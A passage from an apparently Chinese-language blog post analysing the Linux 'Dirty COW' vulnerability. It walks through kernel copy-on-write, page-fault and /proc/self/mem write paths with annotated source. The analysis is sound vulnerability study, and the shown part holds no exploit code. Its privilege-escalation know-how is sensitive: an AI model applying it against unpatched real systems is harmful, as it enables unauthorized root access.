orig_pte);</span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<span class="comment">//非访问共享内存（私有文件映射）引起的缺页异常（写操作）</span></span><br><span class="line">		<span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte);<span class="comment">//进行写时复制</span></span><br><span class="line">	<span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);<span class="comment">//访问共享内存引起的缺页异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>见注释，不再赘叙</p>
<h4 id="处理写时复制（无内存页）：-do-cow-fault"><a href="#处理写时复制（无内存页）：-do-cow-fault" class="headerlink" title="处理写时复制（无内存页）： do_cow_fault()"></a>处理写时复制（无内存页）： do_cow_fault()</h4><p>本篇主要关注写时复制的过程；COW流程在第一次写时触发缺页异常最终便会进入到 <code>do_cow_fault()</code> 中处理，该函数同样位于 <code>mm/memory.c</code> 中，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_cow_fault</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">pmd_t</span> *pmd,</span></span><br><span class="line"><span class="params">		<span class="type">pgoff_t</span> pgoff, <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">pte_t</span> orig_pte)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>, *<span class="title">new_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line">	<span class="type">spinlock_t</span> *ptl;</span><br><span class="line">	<span class="type">pte_t</span> *pte;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(anon_vma_prepare(vma)))</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);<span class="comment">//分配新物理页</span></span><br><span class="line">	<span class="keyword">if</span> (!new_page)<span class="comment">//失败了</span></span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) &#123;</span><br><span class="line">		page_cache_release(new_page);</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);<span class="comment">//读取文件内容到fault_page</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line">		<span class="keyword">goto</span> uncharge_out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fault_page)</span><br><span class="line">		copy_user_highpage(new_page, fault_page, address, vma);<span class="comment">//拷贝fault_page内容到new_page</span></span><br><span class="line">	__SetPageUptodate(new_page);</span><br><span class="line"></span><br><span class="line">	pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<span class="comment">//多线程操作，上锁？</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;<span class="comment">//pte和orig_pte不一致，说明中间有人修改了pte，那么释放fault_page和new_page页面并退出</span></span><br><span class="line">		pte_unmap_unlock(pte, ptl);</span><br><span class="line">		<span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">			unlock_page(fault_page);</span><br><span class="line">			page_cache_release(fault_page);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment">			 * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">goto</span> uncharge_out;</span><br><span class="line">	&#125;</span><br><span class="line">	do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>);<span class="comment">//设置pte，置换该进程中的pte表项，对于写操作会将该页标脏（该函数会调用maybe_mkwrite()函数，其会调用pte_mkdirty()函数标脏该页）</span></span><br><span class="line">	mem_cgroup_commit_charge(new_page, memcg, <span class="literal">false</span>);</span><br><span class="line">	lru_cache_add_active_or_unevictable(new_page, vma);</span><br><span class="line">	pte_unmap_unlock(pte, ptl);</span><br><span class="line">	<span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">		unlock_page(fault_page);<span class="comment">//释放fault_page</span></span><br><span class="line">		page_cache_release(fault_page);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment">		 * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">uncharge_out:</span><br><span class="line">	mem_cgroup_cancel_charge(new_page, memcg);</span><br><span class="line">	page_cache_release(new_page);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数会将拷贝的新的页更新到页表中，对应着开头的这张图，不过此时还没进行对应进程的写操作，需要等到第二次缺页异常时写入该页</p>
<p><img src="https://i.loli.net/2021/04/12/e7Y9HCJjIm4suAk.png" srcset="/img/loading.gif" lazyload alt="FD5A70A4D50C2B733ED19AB5E5B83B3B.png"></p>
<h4 id="处理写时复制（有内存页）：do-wp-page"><a href="#处理写时复制（有内存页）：do-wp-page" class="headerlink" title="处理写时复制（有内存页）：do_wp_page()"></a>处理写时复制（有内存页）：do_wp_page()</h4><p>当通过 <code>do_fault()</code> 获取内存页之后，第二次触发缺页异常时便会最终交由 <code>do_wp_page()</code> 函数处理，该函数同样位于 <code>mm/memory.c</code> 中，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This routine handles present pages, when users try to write</span></span><br><span class="line"><span class="comment"> * to a shared page. It is done by copying the page to a new address</span></span><br><span class="line"><span class="comment"> * and decrementing the shared-page counter for the old page.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that this routine assumes that the protection checks have been</span></span><br><span class="line"><span class="comment"> * done by the caller (the low-level page fault routine in most cases).</span></span><br><span class="line"><span class="comment"> * Thus we can safely just mark it writable once we&#x27;ve done any necessary</span></span><br><span class="line"><span class="comment"> * COW.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We also mark the page dirty at this point even though the page will</span></span><br><span class="line"><span class="comment"> * change only once the write actually happens. This avoids a few races,</span></span><br><span class="line"><span class="comment"> * and potentially makes it more efficient.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span></span><br><span class="line"><span class="comment"> * but allow concurrent faults), with pte both mapped and locked.</span></span><br><span class="line"><span class="comment"> * We return with mmap_sem still held, but pte unmapped and unlocked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_wp_page</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">pte_t</span> *page_table, <span class="type">pmd_t</span> *pmd,</span></span><br><span class="line"><span class="params">		<span class="type">spinlock_t</span> *ptl, <span class="type">pte_t</span> orig_pte)</span></span><br><span class="line">	__<span class="title function_">releases</span><span class="params">(ptl)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">old_page</span>;</span><span class="comment">//原有的页</span></span><br><span class="line"></span><br><span class="line">	old_page = vm_normal_page(vma, address, orig_pte);<span class="comment">//获取缺页的线性地址对应的struct page结构，对于一些特殊映射的页面（如页面回收、页迁移和KSM等），内核并不希望这些页参与到内存管理的一些流程当中，称之为 special mapping，并无对应的struct page结构体</span></span><br><span class="line">	<span class="keyword">if</span> (!old_page) &#123;<span class="comment">//NULL，说明是一个 special mapping 页面；否则说明是normal mapping页面</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a</span></span><br><span class="line"><span class="comment">		 * VM_PFNMAP VMA.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * We should not cow pages in a shared writeable mapping.</span></span><br><span class="line"><span class="comment">		 * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">				     (VM_WRITE|VM_SHARED))</span><br><span class="line">			<span class="keyword">return</span> wp_pfn_shared(mm, vma, address, page_table, ptl,</span><br><span class="line">					     orig_pte, pmd);</span><br><span class="line"></span><br><span class="line">		pte_unmap_unlock(page_table, ptl);</span><br><span class="line">		<span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">				    orig_pte, old_page);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Take out anonymous pages first, anonymous shared vmas are</span></span><br><span class="line"><span class="comment">	 * not dirty accountable.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="comment">//先处理匿名页面</span></span><br><span class="line">	<span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;<span class="comment">//原页面为匿名页面 &amp;&amp; 不是ksm页面</span></span><br><span class="line">		<span class="keyword">if</span> (!trylock_page(old_page)) &#123;<span class="comment">//多线程相关操作，判断是否有其他线程的竞争</span></span><br><span class="line">			page_cache_get(old_page);</span><br><span class="line">			pte_unmap_unlock(page_table, ptl);</span><br><span class="line">			lock_page(old_page);</span><br><span class="line">			page_table = pte_offset_map_lock(mm, pmd, address,</span><br><span class="line">							 &amp;ptl);</span><br><span class="line">			<span class="keyword">if</span> (!pte_same(*page_table, orig_pte)) &#123;</span><br><span class="line">				unlock_page(old_page);</span><br><span class="line">				pte_unmap_unlock(page_table, ptl);</span><br><span class="line">				page_cache_release(old_page);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			page_cache_release(old_page);</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//此时没有其他线程与本线程竞争了，调用 reuse_swap_page() 判断使用该页的是否只有一个进程，若是的话就直接重用该页</span></span><br><span class="line">		<span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * The page is all ours.  Move it to our anon_vma so</span></span><br><span class="line"><span class="comment">			 * the rmap code will not search our parent or siblings.</span></span><br><span class="line"><span class="comment">			 * Protected against the rmap code by the page lock.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">			unlock_page(old_page);</span><br><span class="line">			<span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">					     orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//一般的cow流程会走到这里，重用由do_cow_fault()分配好的内存页，不会再开辟新页</span></span><br><span class="line">		&#125;</span><br><span class="line">		unlock_page(old_page);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">					(VM_WRITE|VM_SHARED))) &#123;</span><br><span class="line">		<span class="keyword">return</span> wp_page_shared(mm, vma, address, page_table, pmd,</span><br><span class="line">				      ptl, orig_pte, old_page);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Ok, we need to copy. Oh, well..</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="comment">//实在没法重用了，进行写时复制</span></span><br><span class="line">	page_cache_get(old_page);</span><br><span class="line"></span><br><span class="line">	pte_unmap_unlock(page_table, ptl);</span><br><span class="line">	<span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">			    orig_pte, old_page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们不难看出其核心思想是尝试重用内存页，实在没法重用时才会进行写时复制</p>
<h2 id="三、COW-与-缺页异常相关流程"><a href="#三、COW-与-缺页异常相关流程" class="headerlink" title="三、COW 与 缺页异常相关流程"></a>三、COW 与 缺页异常相关流程</h2><p>当我们使用mmap映射一个只读文件，随后开辟一个新进程，尝试通过 <code>/proc/self/mem</code> 文件直接往一个原有的共享页面写入内容时，其流程应当如下：</p>
<h3 id="系统调用：writeの执行流"><a href="#系统调用：writeの执行流" class="headerlink" title="系统调用：writeの执行流"></a>系统调用：writeの执行流</h3><p>用户态的 <code>write</code> 系统调用最终对应的是内核中的 <code>sys_write()</code>，该系统调用定义于 <code>fs/read_write.c</code> 中，如下：</p>
<blockquote>
<p>直接在源码里查 sys_write 是没法查到的，这是因为系统调用对应的内核函数名都是由宏 <code>SYSCALL_DEFINE</code>最终拼接而成，可以参见<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/#III-%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E5%AE%9A%E4%B9%89">这里</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(write, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">const</span> <span class="type">char</span> __user *, buf,</span><br><span class="line">		<span class="type">size_t</span>, count)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget_pos(fd);</span><br><span class="line">	<span class="type">ssize_t</span> ret = -EBADF;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (f.file) &#123;</span><br><span class="line">		<span class="type">loff_t</span> pos = file_pos_read(f.file);</span><br><span class="line">		ret = vfs_write(f.file, buf, count, &amp;pos);</span><br><span class="line">		<span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line">			file_pos_write(f.file, pos);</span><br><span class="line">		fdput_pos(f);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>中间的具体执行过程并非本篇重点，我们暂且略过，快进到其调用并写入用户内存页的步骤，执行流如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">	sys_write()</span><br><span class="line">		vfs_write()</span><br><span class="line">			__vfs_write()</span><br><span class="line">				file-&gt;f_op-&gt;write()//该文件于内核中的文件描述符的file_operations结构体，类似于一张函数表，储存了默认的对于一些系统调用的处理函数指针</span><br></pre></td></tr></table></figure>

<h4 id="x2F-proc-x2F-self-x2F-mem：绕过页表项权限"><a href="#x2F-proc-x2F-self-x2F-mem：绕过页表项权限" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;mem：绕过页表项权限"></a>&#x2F;proc&#x2F;self&#x2F;mem：绕过页表项权限</h4><p>“脏牛”通常利用的是 <code>/proc/self/mem</code> 进行越权写入，这也是整个“脏牛”利用中较为核心的流程</p>
<p>对于该文件，其执行流如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mem_write()//套娃，调用下一层的mem_rw()</span><br><span class="line">	mem_rw()//核心函数，分配页 + 拷贝数据（copy_from_user()）</span><br></pre></td></tr></table></figure>

<p>接下来我们来看 <code>mem_rw()</code> 函数，该函数定义于 <code>fs/proc/base.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">mem_rw</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">char</span> __user *buf,</span></span><br><span class="line"><span class="params">			<span class="type">size_t</span> count, <span class="type">loff_t</span> *ppos, <span class="type">int</span> write)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> file-&gt;private_data;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> addr = *ppos;</span><br><span class="line">	<span class="type">ssize_t</span> copied;</span><br><span class="line">	<span class="type">char</span> *page;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!mm)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	page = (<span class="type">char</span> *)__get_free_page(GFP_TEMPORARY);<span class="comment">//分配临时的空闲内存页</span></span><br><span class="line">	<span class="keyword">if</span> (!page)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	copied = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))</span><br><span class="line">		<span class="keyword">goto</span> <span class="built_in">free</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="type">int</span> this_len = <span class="type">min_t</span>(<span class="type">int</span>, count, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果是写入操作，将用户内存空间数据拷贝到临时内存页上</span></span><br><span class="line">		<span class="keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;</span><br><span class="line">			copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// access_remote_vm() 进行内存访问操作</span></span><br><span class="line">		this_len = access_remote_vm(mm, addr, page, this_len, write);</span><br><span class="line">		<span class="keyword">if</span> (!this_len) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!copied)</span><br><span class="line">				copied = -EIO;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果操作非写操作的话（也就是读操作），此时待读出数据已经被读到了临时页面上，拷回用户空间</span></span><br><span class="line">		<span class="keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;</span><br><span class="line">			copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		buf += this_len;</span><br><span class="line">		addr += this_len;</span><br><span class="line">		copied += this_len;</span><br><span class="line">		count -= this_len;</span><br><span class="line">	&#125;</span><br><span class="line">	*ppos = addr;</span><br><span class="line"></span><br><span class="line">	mmput(mm);</span><br><span class="line"><span class="built_in">free</span>:</span><br><span class="line">	free_page((<span class="type">unsigned</span> <span class="type">long</span>) page);<span class="comment">//释放临时内存页</span></span><br><span class="line">	<span class="keyword">return</span> copied;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其流程应当如下：</p>
<ul>
<li>判断该文件对应的内存描述符是否为空，根据笔者调试的结果，第一次进入时确乎为空，返回上层，分配一个对应的 <code>mm_struct</code> 后会重新进入该函数</li>
<li>调用 <code>__get_free_page()</code> 函数分配一个空闲的内存页作为临时储存用户数据的空间</li>
<li>调用 <code>access_remote_vm()</code> 函数进行内存访问操作，根据传入的 <code>write</code> 参数进行读&#x2F;写内存页面操作</li>
</ul>
<p>其中 <code>access_remote_vm()</code> 函数本身为 <code>__access_remote_vm()</code> 函数的套娃，该函数位于 <code>mm/memory.c</code> 中，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Access another process&#x27; address space as given in mm.  If non-NULL, use the</span></span><br><span class="line"><span class="comment"> * given task for page fault accounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __access_remote_vm(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> mm_struct *mm,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">void</span> *buf, <span class="type">int</span> len, <span class="type">int</span> write)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="type">void</span> *old_buf = buf;</span><br><span class="line"></span><br><span class="line">	down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	<span class="comment">/* ignore errors, just check how much was successfully transferred */</span></span><br><span class="line">	<span class="keyword">while</span> (len) &#123;</span><br><span class="line">		<span class="type">int</span> bytes, ret, offset;</span><br><span class="line">		<span class="type">void</span> *maddr;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">		ret = get_user_pages(tsk, mm, addr, <span class="number">1</span>,</span><br><span class="line">				write, <span class="number">1</span>, &amp;page, &amp;vma); <span class="comment">//获取操作（从...读取/向...写入）对应的目标内存页</span></span><br><span class="line">		<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123; <span class="comment">//失败了，未能获取到用户页</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Check if this is a VM_IO | VM_PFNMAP VMA, which</span></span><br><span class="line"><span class="comment">			 * we can access using slightly different code.</span></span><br><span 